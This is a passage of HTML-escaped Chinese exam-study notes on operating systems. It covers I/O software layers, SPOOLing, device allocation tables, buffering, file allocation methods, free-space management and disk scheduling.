系统。系统会在用户登录时为其建立一个用户管理进程，而 LUT 就存放在用户管理进程的 PCB 中。&lt;/p&gt;
&lt;p&gt;7、根据设备类型选择调用相应的驱动程序&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3、设备驱动程序（比如打印机驱动）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;设置设备寄存器、检查设备状态&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4、中断处理程序&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;设备中断处理程序要完成：①唤醒被阻塞的驱动进程；②保存被中断进程的 CPU 现场信息；③转人相应的设备处理程序；④处理中断；⑤恢复被中断进程的 CPU 现场。&lt;br&gt;
对中断进行处理的过程为：①测定是否有未响应的中断信号；②保护被中断进程的 CPU 现场：&lt;br&gt;
③转人相应的设备处理程序；④处理中断；⑤恢复 CPU 现场并退出中断。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5、硬件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;执行 IO 操作，有机械部件、电子部件组成&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;理解并记住 I/O 软件各个层次之间的顺序，要能够推理判断某个处理应该是在哪个层次完成的（最常考的&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;是设备独立性软件、设备驱动程序这两层。只需理解一个特点即可：直接涉及到硬件具体细节、且与中&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;断无关的操作肯定是在设备驱动程序层完成的；没有涉及硬件的、对各种设备都需要进行的管理工作都&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;是在设备独立性软件层完成的)&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;51_5-i-o核心子系统&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#51_5-i-o核心子系统&#34;&gt;#&lt;/a&gt; 5.1_5 I-O 核心子系统&lt;/h3&gt;
&lt;p&gt;1、用户层软件&lt;/p&gt;
&lt;p&gt;假脱机系统&lt;/p&gt;
&lt;p&gt;2、设备独立性软件（设备无关性软件）&lt;/p&gt;
&lt;p&gt;IO 调度、设备保护、设备分配与回收、缓冲区管理&lt;/p&gt;
&lt;p&gt;3、设备驱动程序（比如打印机驱动）&lt;/p&gt;
&lt;p&gt;4、中断处理程序&lt;/p&gt;
&lt;p&gt;5、硬件&lt;/p&gt;
&lt;h3 id=&#34;51_6-假脱机技术&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#51_6-假脱机技术&#34;&gt;#&lt;/a&gt; 5.1_6 假脱机技术&lt;/h3&gt;
&lt;p&gt;1、什么是脱机技术，脱机技术可以解决什么问题&lt;/p&gt;
&lt;p&gt;脱离主机的控制进行输入 / 输出控制&lt;/p&gt;
&lt;p&gt;2、假脱机技术&lt;/p&gt;
&lt;p&gt;SPPOLing 系统（是用软件的方式模拟脱机技术）：必须要有多道程序并发进行&lt;/p&gt;
&lt;p&gt;假脱机技术的实现原理&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;输入井和输出井 ———— 模拟脱机输入 / 输出时的磁带&lt;/li&gt;
&lt;li&gt;输入进程和输出进程 ———— 模拟脱机输入输出时的外围控制机&lt;/li&gt;
&lt;li&gt;输入缓冲区和输出缓冲区 ———— 内存中的缓冲区，输入、输出时的 “中转站”&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;3、共享打印机的原理分析&lt;/p&gt;
&lt;p&gt;用 SPOOLing 技术将独占式的打印机 &amp;quot;虚拟&amp;quot; 成共享打印机】&lt;/p&gt;
&lt;p&gt;独占式设备一一只允许各个进程串行使用的设备。一段时间内只能满足一个进程的请求。&lt;br&gt;
共享设备一一允许多个进程 “同时” 使用的设备（宏观上同时使用，微观上可能是交替使&lt;br&gt;
用)。可以同时满足多个进程的使用请求。&lt;/p&gt;
&lt;p&gt;虚拟设备一一采用 SPOOLing 技术将独占设备改造成虚拟的共享设备，可同时分配给多个进程使&lt;br&gt;
用（如采用 SPOOLing 技术实现的共享打印机）&lt;/p&gt;
&lt;h3 id=&#34;51_7-设备的分配与回收&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#51_7-设备的分配与回收&#34;&gt;#&lt;/a&gt; 5.1_7 设备的分配与回收&lt;/h3&gt;
&lt;p&gt;1、设备分配时应考虑的因素&lt;/p&gt;
&lt;p&gt;设备的固有属性：独占设备、共享设备、虚拟设备&lt;/p&gt;
&lt;p&gt;设备分配算法：先来先服务，优先级高者优先，短任务优先等&lt;/p&gt;
&lt;p&gt;设备分配中的安全：为进程分配一个设备后就将进程阻塞，本次 I/O 完成后才将进程唤醒（一个时间段内每个进程只能使用一个设备&lt;/p&gt;
&lt;p&gt;优点：破坏了 “请求和保持” 条件，不会死锁&lt;br&gt;
缺点：对于一个进程来说，CPU 和 I/O 设备只能串行工作&lt;/p&gt;
&lt;p&gt;不安全分配方式：进程发出 I/O 请求后，系统为其分配 I/O 设备，进程可继续执行，之后还可以发出&lt;br&gt;
新的 I/O 请求。只有某个 I/O 请求得不到满足时才将进程阻塞。(一个进程可以同时使用多个设备)&lt;/p&gt;
&lt;p&gt;优点：进程的计算任务和 I/O 任务可以并行处理，使进程迅速推进&lt;br&gt;
缺点：有可能发生死锁（死锁避免、死锁的检测和解除）&lt;/p&gt;
&lt;p&gt;2、静态分配与动态分配&lt;/p&gt;
&lt;p&gt;静态分配：进程运行前为其分配全部所需资源、运行结束后归还资源（破坏了请求和保持条件，不会发生死锁）&lt;/p&gt;
&lt;p&gt;动态分配：运行中动态分配&lt;/p&gt;
&lt;p&gt;3、设备分配管理中的数据结构&lt;/p&gt;
&lt;p&gt;系统设备表 SDT：记录了系统中全部设备的情况，每个设备对应一个表目。记录表目：（设备类型、设备标识符、DCT、驱动程序入口）了系统中全部设备的情况&lt;/p&gt;
&lt;p&gt;设备控制表 DCT：系统为每个设备设置一张 DCT，用于记录设备情况（设备类型、设备标识符、设备状态、指向控制器表的指针、重复执行次数或事件、设备队列的队首指针）&lt;/p&gt;
&lt;p&gt;控制器控制表 COCT：每个设备控制器都会对应一张 COCT。操作系统根据 COCT 的信息对控制器进行操作和管理。&lt;/p&gt;
&lt;p&gt;通道控制表 CHCT：每个通道都会对应一张 CHCT。操作系统根据 CHCT 的信息对通道进行操作和管理 （通道标识符、通道状态、与通道连接的控制器表首址、通道队列的队首指针、通道队列的队尾指针）&lt;/p&gt;
&lt;p&gt;4、设备分配的步骤&lt;/p&gt;
&lt;p&gt;根据进程请求的物理设备名 ——&amp;gt; 系统设备表 ——&amp;gt; 设备控制表 ——&amp;gt; 控制器控制表 ——&amp;gt; 通道&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230809125036440.png&#34; alt=&#34;image-20230809125036440&#34;&gt;&lt;/p&gt;
&lt;p&gt;5、设备分配步骤的改进方法&lt;/p&gt;
&lt;p&gt;建立逻辑设备名和设备的映射&lt;/p&gt;
&lt;p&gt;6、逻辑设备表的设置问题&lt;/p&gt;
&lt;p&gt;整个系统只有一张 LUT: 各用户所用的逻辑设备名不允许重复，适用于单用户操作系统&lt;br&gt;
每个用户一张 LUT: 不同用户的逻辑设备名可重复，适用于多用户操作系统&lt;/p&gt;
&lt;h3 id=&#34;51_8-缓冲区管理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#51_8-缓冲区管理&#34;&gt;#&lt;/a&gt; 5.1_8 缓冲区管理&lt;/h3&gt;
&lt;p&gt;1、什么是缓冲区？有什么作用？&lt;/p&gt;
&lt;p&gt;缓冲区是一个存储区域&lt;/p&gt;
&lt;p&gt;可以由专门的硬件寄存器组成，也可以利用内存作为缓冲区&lt;/p&gt;
&lt;p&gt;缓冲区的作用：&lt;/p&gt;
&lt;p&gt;1、缓和 CPU 与 I/O 设备之间速度不匹配的矛盾&lt;/p&gt;
&lt;p&gt;2、减少对 CPU 的中断频率&lt;/p&gt;
&lt;p&gt;3、解决数据粒度不匹配的问题&lt;/p&gt;
&lt;p&gt;4、提高 CPU 与 IO 设备之间的并行性&lt;/p&gt;
&lt;p&gt;2、单缓冲&lt;/p&gt;
&lt;p&gt;在内存中分配一块缓冲区&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意：当缓冲区数据非空时，不能往缓冲区冲入数据，只能从缓冲区把数据传出；当缓冲区为空时，&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;可以往缓冲区冲入数据，但必须把缓冲区充满以后，才能从缓冲区把数据传出。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;单缓冲题目中，假设初始状态为：工作区满，缓冲区空&lt;/p&gt;
&lt;p&gt;C 为 CPU 的处理速度  M 为传输速度，T 为 I/O 设备的输入速度&lt;/p&gt;
&lt;p&gt;处理一块时间 = max（C,T)+M&lt;/p&gt;
&lt;p&gt;3、双缓冲&lt;/p&gt;
&lt;p&gt;在内存中分配两块缓冲区&lt;/p&gt;
&lt;p&gt;双缓冲题目中，假设初始状态为：工作区空，其中一个缓冲区满，另一个缓冲区空&lt;/p&gt;
&lt;p&gt;max(T,C+M)&lt;/p&gt;
&lt;p&gt;4、循环缓冲&lt;/p&gt;
&lt;p&gt;将多个大小相等的缓冲区链接成一个循环队列。&lt;/p&gt;
&lt;p&gt;5、缓冲池&lt;/p&gt;
&lt;p&gt;由系统中共用的缓冲区组成。这些缓冲区可以分为：空缓冲队列、装满输入数据的缓冲队列、装满输出数据的缓冲队列&lt;/p&gt;
&lt;h3 id=&#34;文件的物理结构外存的组织方式-重点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件的物理结构外存的组织方式-重点&#34;&gt;#&lt;/a&gt; 文件的物理结构（外存的组织方式） 重点&lt;/h3&gt;
&lt;p&gt;1、对非空闲磁盘块的管理&lt;/p&gt;
&lt;p&gt;连续分配：连续分配方式要求每个文件在磁盘上占有一组连续的块（也就是逻辑块上相邻  物理块上也要相邻），对文件的拓展不方便，存储空间利用率低会产生难以利用的磁盘碎片，支持顺序访问和直接访问（即随机访问）&lt;/p&gt;
&lt;p&gt;物理块号 = 起始块号 + 逻辑块号&lt;/p&gt;
&lt;p&gt;连续分配的文件在顺序读 / 写时速度最快&lt;/p&gt;
&lt;p&gt;优点：支持顺序访问和直接访问（即随机访问）；连续分配的文件在顺序访问时速度最快&lt;br&gt;
缺点：不方便文件拓展；存储空间利用率低，会产生磁盘碎片 ，不能灵活的删除和插入记录&lt;/p&gt;
&lt;p&gt;链接分配采取离散分配的方式&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;隐式链接：采用链接分配方式的文件，只支持顺序访问，不支持随机访问，方便拓展&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;优点：很方便文件拓展，不会有碎片问题，外存利用率高。&lt;br&gt;
缺点：只支持顺序访问，不支持随机访问，查找效率低，指向下一个盘块的指针也需要耗费少量&lt;br&gt;
的存储空间。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;显示链接：文件分配表显式记录下一块物理块的位置，方便拓展，支持随机访问和顺序访问，文件表会占内存空间  相比隐式链接来说访问速度快  因为块号的转换过程不需要访问磁盘，不会产生外部碎片&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;优点：很方便文件拓展，不会有碎片问题，外存利用率高，并且支持随机访问。相比于隐式链接&lt;br&gt;
来说，&lt;strong&gt;地址转换时不需要访问磁盘，因此文件的访问效率更高。&lt;/strong&gt;&lt;br&gt;
缺点：文件分配表的需要占用一定的存储空间。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230805223539619.png&#34; alt=&#34;image-20230805223539619&#34;&gt;&lt;/p&gt;
&lt;p&gt;索引分配&lt;/p&gt;
&lt;p&gt;索引分配允许文件离散地分配在各个磁盘块中，系统会为每个文件建立一张索引表，索引表记录了文件的各个逻辑块对应的物理块&lt;/p&gt;
&lt;p&gt;索引表存放的磁盘块称为索引块。文件数据存放的磁盘块称为数据块&lt;/p&gt;
&lt;p&gt;支持随机访问，文件拓展也很容易实现，但是索引表需要占用一定的存储空间&lt;/p&gt;
&lt;p&gt;索引分配的三种方法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;链接方案：如果索引表太大，一个索引块装不下可以将多个索引块链接起来存放&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;多层索引：建立多层索引（原理类似于多级页表）。使第一层索引块指向第二层的索引块。还可根据&lt;br&gt;
文件大小的要求再建立第三层、第四层索引块。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;若采用多层索引，则各层索引表大小不能超过一个磁盘块&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;混合索引：多种索引分配方式的结合。例如，一个文件的顶级索引表中，既包含直接地址索引（直接&lt;br&gt;
指向数据块)，又包含一级间接索引（指向单层索引表）、还包含两级间接索引（指向两层索引表）。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;优点：①既能顺序存取，又能随机存取：②能适应文件的动态增长；③方更插入、修改和别除记录。&lt;/p&gt;
&lt;p&gt;缺点：①需要较多的寻道次数和较长的寻道时间；②索引表增加了系统开销，包括内存空间和存取时间。&lt;/p&gt;
&lt;p&gt;若顺序文件中所含有的记录数为 N, 则检索到指定关键字的记录平均须查找 N/2 个记录。但对于素引顺序文件，检素到指定关键字的记录平均须查找&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msqrt&gt;&lt;mi&gt;N&lt;/mi&gt;&lt;/msqrt&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;\sqrt{N}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.04em;vertical-align:-0.1133em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord sqrt&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.9267em;&#34;&gt;&lt;span class=&#34;svg-align&#34; style=&#34;top:-3em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34; style=&#34;padding-left:0.833em;&#34;&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10903em;&#34;&gt;N&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-2.8867em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;hide-tail&#34; style=&#34;min-width:0.853em;height:1.08em;&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#39;400em&#39; height=&#39;1.08em&#39; viewBox=&#39;0 0 400000 1080&#39; preserveAspectRatio=&#39;xMinYMin slice&#39;&gt;&lt;path d=&#39;M95,702
c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14
c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54
c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10
s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429
c69,-144,104.5,-217.7,106.5,-221
l0 -0
c5.3,-9.3,12,-14,20,-14
H400000v40H845.2724
s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7
c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z
M834 80h400000v40h-400000z&#39;/&gt;&lt;/svg&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.1133em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; 个记录，因而其检&lt;br&gt;
索效率比顺序文件提高了约&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msqrt&gt;&lt;mi&gt;N&lt;/mi&gt;&lt;/msqrt&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;\sqrt{N}/2&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.1767em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord sqrt&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.9267em;&#34;&gt;&lt;span class=&#34;svg-align&#34; style=&#34;top:-3em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34; style=&#34;padding-left:0.833em;&#34;&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10903em;&#34;&gt;N&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-2.8867em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;hide-tail&#34; style=&#34;min-width:0.853em;height:1.08em;&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#39;400em&#39; height=&#39;1.08em&#39; viewBox=&#39;0 0 400000 1080&#39; preserveAspectRatio=&#39;xMinYMin slice&#39;&gt;&lt;path d=&#39;M95,702
c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14
c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54
c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10
s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429
c69,-144,104.5,-217.7,106.5,-221
l0 -0
c5.3,-9.3,12,-14,20,-14
H400000v40H845.2724
s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7
c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z
M834 80h400000v40h-400000z&#39;/&gt;&lt;/svg&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.1133em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; 倍。因此，包含 40000 条记录的文件，采用索引顺序文件组织&lt;br&gt;
方式的平均检索效率比顺序文件提高了&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msqrt&gt;&lt;mn&gt;40000&lt;/mn&gt;&lt;/msqrt&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;\sqrt{40000}/2&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.1572em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord sqrt&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.9072em;&#34;&gt;&lt;span class=&#34;svg-align&#34; style=&#34;top:-3em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34; style=&#34;padding-left:0.833em;&#34;&gt;&lt;span class=&#34;mord&#34;&gt;40000&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-2.8672em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;hide-tail&#34; style=&#34;min-width:0.853em;height:1.08em;&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#39;400em&#39; height=&#39;1.08em&#39; viewBox=&#39;0 0 400000 1080&#39; preserveAspectRatio=&#39;xMinYMin slice&#39;&gt;&lt;path d=&#39;M95,702
c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14
c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54
c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10
s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429
c69,-144,104.5,-217.7,106.5,-221
l0 -0
c5.3,-9.3,12,-14,20,-14
H400000v40H845.2724
s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7
c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z
M834 80h400000v40h-400000z&#39;/&gt;&lt;/svg&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.1328em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;=100 倍。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;超级超级超级重要考点&lt;/strong&gt;：①要会根据多层索引、混合索引的结构计算出文件的最大长度 (Ky: 各级索&lt;br&gt;
引表最大不能超过一个块)；②要能自己分析访问某个数据块所需要的读磁盘次数 (Ky:FCB 中会存有&lt;br&gt;
指向顶级索引块的指针，因此可以根据 FCB 读入顶级索引块。每次读入下一级的索引块都需要一次读磁&lt;br&gt;
盘操作。另外，要注意题目条件一一顶级索引块是否已调入内存)&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230806142623837.png&#34; alt=&#34;image-20230806142623837&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;文件存储空间管理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件存储空间管理&#34;&gt;#&lt;/a&gt; 文件存储空间管理&lt;/h3&gt;
&lt;p&gt;1、存储空间的划分与初始化&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;存储空间的划分：将物理磁盘划分&lt;br&gt;
为一个个文件卷（逻辑卷、逻辑盘）&lt;/li&gt;
&lt;li&gt;存储空间的初始化：将各个文件卷划分为目录区、文件区&lt;/li&gt;
&lt;li&gt;目录区主要存放文件目录信息 (FCB)、月于磁盘存储空间管理的信息&lt;/li&gt;
&lt;li&gt;文件去用于存放文件数据&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;2、几种管理方法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;空闲表法：首位置 + 长度，回收时注意修改   适用于连续分配方式&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;空闲链表法（空闲盘块链、空闲盘区链&lt;/p&gt;
&lt;p&gt;空闲盘块链：操作系统保存着链头、链尾指针  适用于离散分配的物理结构。&lt;/p&gt;
&lt;p&gt;如何分配：若某文件申请 K 个盘块，则从链头开始依次摘下 K 个盘块分配，并修改空闲链的链头指针。&lt;br&gt;
如何回收：回收的盘块依次挂到链尾，并修改空闲链的链尾指针。&lt;/p&gt;
&lt;p&gt;空闲盘区链：操作系统保存着链头、链尾指针  适用于离散分配的物理结构。&lt;/p&gt;
&lt;p&gt;如何分配：若某文件申请 K 个盘块，则可以采用首次适应、最佳适应等算法，从链头开始检索按照算法规则找到一个大小符合要求的空闲盘区，分配给文件。若没有合适的连续空闲块，也可以将不同盘区的盘块同时分配给一个文件，注意分配后可能要修改相应的链指针、盘区大小等数据&lt;/p&gt;
&lt;p&gt;如何回收：若回收区和某个空闲盘区相邻，则需要将回收区合并到空闲盘区中。若回收区没有和任何空闲区相邻，将回收区作为单独的一个空闲盘区挂到链尾。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230806152518447.png&#34; alt=&#34;image-20230806152518447&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;位示图法&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;位示图：每个二进制位对应一个盘块。在本例中，“0” 代表盘块空闲，“1” 代表盘块已分配。位示图一般用连续的 “字” 来表示，如本例中一个字的字长是 16 位，字中的每一位对应一个盘块。因此可以用（字号，位号) 对应一个盘块号。当然有的题目中也描述为（行号，列号）&lt;/p&gt;
&lt;p&gt;(字号，位号)=(i，j) 的二进制位对应的盘块号 b=n*i+j     n 表示字长&lt;/p&gt;
&lt;p&gt;b 号盘块对应的字号 i=b/n, 位号 j=b% n&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;UNIX 系统采用成组链接法：文件卷的目录区中专门用一个磁盘块作为超级块，当系统启动时需要将超级内存块读入内存。并且保证内存与外存中的超级块数据一致。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;磁盘的结构&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#磁盘的结构&#34;&gt;#&lt;/a&gt; 磁盘的结构&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230811143600957.png&#34; alt=&#34;image-20230811143600957&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;磁盘调度算法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#磁盘调度算法&#34;&gt;#&lt;/a&gt; 磁盘调度算法&lt;/h3&gt;
&lt;p&gt;1、一次磁盘读 / 写操作需要的时间&lt;/p&gt;
&lt;p&gt;①启动磁头臂是需要时间的。假设耗时为 s:&lt;br&gt;
②移动磁头也是需要时间的。假设磁头匀速移动，每跨越一个磁道耗时为 m, 总共需要跨越 n 条磁道&lt;/p&gt;
&lt;p&gt;则：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;寻道时间 Ts=s+m*n&lt;/li&gt;
&lt;li&gt;平均所需延迟时间 Tr=1/(2r)   (设磁盘转速为 r 单位 转 / 秒)&lt;/li&gt;
&lt;li&gt;传输时间 Tt=b/(rN)  N 为每个磁盘上的字节数 此次读 / 写字节数为 b&lt;/li&gt;
&lt;li&gt;总的平均存取时间 Ta=Ts+1/2r+b/rN)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;2、磁盘调度算法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;先来先服务（FCFS）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;根据进程请求访问磁盘的先后顺序进行调度&lt;/p&gt;
&lt;p&gt;优点：公平；如果请求访问的磁道比较集中的话，算法性能还算过的去&lt;br&gt;
缺点：如果有大量进程竞争使用磁盘，请求访问的磁道很分散，则 FCFS 在性能上很差，寻道时间长。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;最短寻找时间优先（SSTF）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;优先处理与当前磁头最近的磁道，可以保证每次寻到时间最短，但是不能保证总的寻到时间最短&lt;/p&gt;
&lt;p&gt;优点：性能较好，平均寻道时间短&lt;/p&gt;
&lt;p&gt;缺点：但是可能会产生饥饿现象（产生原因：磁头在一个小区域内来回来去地移动）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;扫描算法（SCAN）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;只有磁头移动到最外侧磁道的时候才能往内移动，移动到最内侧磁道的时候才能往外移动&lt;/p&gt;
